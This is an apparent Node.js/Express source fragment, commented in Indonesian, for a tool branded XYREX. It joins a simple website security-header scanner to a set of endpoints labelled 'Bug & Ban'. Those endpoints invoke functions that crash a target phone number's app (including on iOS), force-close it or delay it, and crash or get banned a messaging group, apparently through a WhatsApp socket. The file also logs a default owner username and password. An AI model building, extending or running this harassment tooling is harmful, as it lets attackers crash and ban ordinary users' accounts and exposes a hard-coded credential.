        clearTimeout(timeout);

        const headers = response.headers;
        const vulnerabilities = [];
        const info = [];

        if (!headers.get('x-frame-options')) vulnerabilities.push({ type: 'Clickjacking', level: 'Medium', detail: 'Header X-Frame-Options tidak ada.' });
        if (!headers.get('content-security-policy')) vulnerabilities.push({ type: 'XSS', level: 'Medium', detail: 'Header Content-Security-Policy tidak ada.' });
        if (!headers.get('x-content-type-options')) vulnerabilities.push({ type: 'MIME Sniffing', level: 'Low', detail: 'Header X-Content-Type-Options tidak ada.' });
        if (!headers.get('strict-transport-security')) vulnerabilities.push({ type: 'SSL Strip', level: 'Low', detail: 'Header HSTS tidak ada.' });

        info.push('Server: ' + (headers.get('server') || 'Disembunyikan'));
        info.push('X-Powered-By: ' + (headers.get('x-powered-by') || 'Disembunyikan'));
        info.push('Status Code: ' + response.status);

        const dns = require('dns').promises;
        const hostname = new URL(url).hostname;
        try {
            const addresses = await dns.lookup(hostname, { all: true });
            info.push('IP Address: ' + addresses.map(a => a.address).join(', '));
        } catch (e) { info.push('IP Address: Gagal resolve DNS'); }

        if (vulnerabilities.length === 0) vulnerabilities.push({ type: 'Header Config', level: 'Aman', detail: 'Semua header keamanan utama terpasang.' });

        res.json({ status: true, data: { target: url, info, vulnerabilities } });
    } catch (err) {
        res.status(500).json({ status: false, message: err.message, data: { target: url, vulnerabilities: [{ type: 'Connection Error', level: 'Critical', detail: 'Website tidak merespon.' }] } });
    }
});

// Endpoint Bug & Ban Patch Baru
app.post('/api/bug/crash-ios', async (req, res) => { try { await bugNomor.bugCrashIOS(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
app.post('/api/bug/foreclose', async (req, res) => { try { await bugNomor.bugForeclose(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
app.post('/api/bug/crash', async (req, res) => { try { await bugNomor.bugCrash(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
app.post('/api/bug/delay', async (req, res) => { try { await bugNomor.bugDelay(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
app.post('/api/ban/crash', async (req, res) => { try { await banGrup.banGrupCrash(sock, req.body.groupId); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
app.post('/api/ban/ban', async (req, res) => { try { await banGrup.banGrupBan(sock, req.body.groupId, req.body.inviteCode); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });


server.listen(3000, () => {
  console.log('[XYREX] Server jalan di http://localhost:3000');
  console.log('[XYREX] Owner default: Dlizz / 20111608');
});
